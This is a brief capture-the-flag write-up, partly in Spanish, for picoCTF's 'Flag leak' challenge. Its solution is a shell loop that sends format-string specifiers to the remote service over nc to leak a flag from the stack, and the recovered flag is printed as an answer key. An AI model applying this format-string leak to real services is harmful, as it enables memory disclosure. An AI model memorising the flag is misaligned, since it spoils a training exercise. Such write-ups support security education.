# Flag leak
## Descripcipción
Additional details will be available after launching your challenge instance.

Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/92/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/92/vuln.c). And connect with it using:`nc saturn.picoctf.net 49316`
## Pistas
- NONE
## Solucion
```
┌──(kali㉿kali)-[~/Documents/binary/flack]
└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 49316 |grep -Ei (pico|ctf) ;done

CTF{L34k1ng_Fl4g_0ff_St4ck_ff01c38e}

```
## Bandera
picoCTF{L34k1ng_Fl4g_0ff_St4ck_ff01c38e}
## Notas adicionales
## Referencias
https://www.youtube.com/watch?v=FrnpBR1yEAY
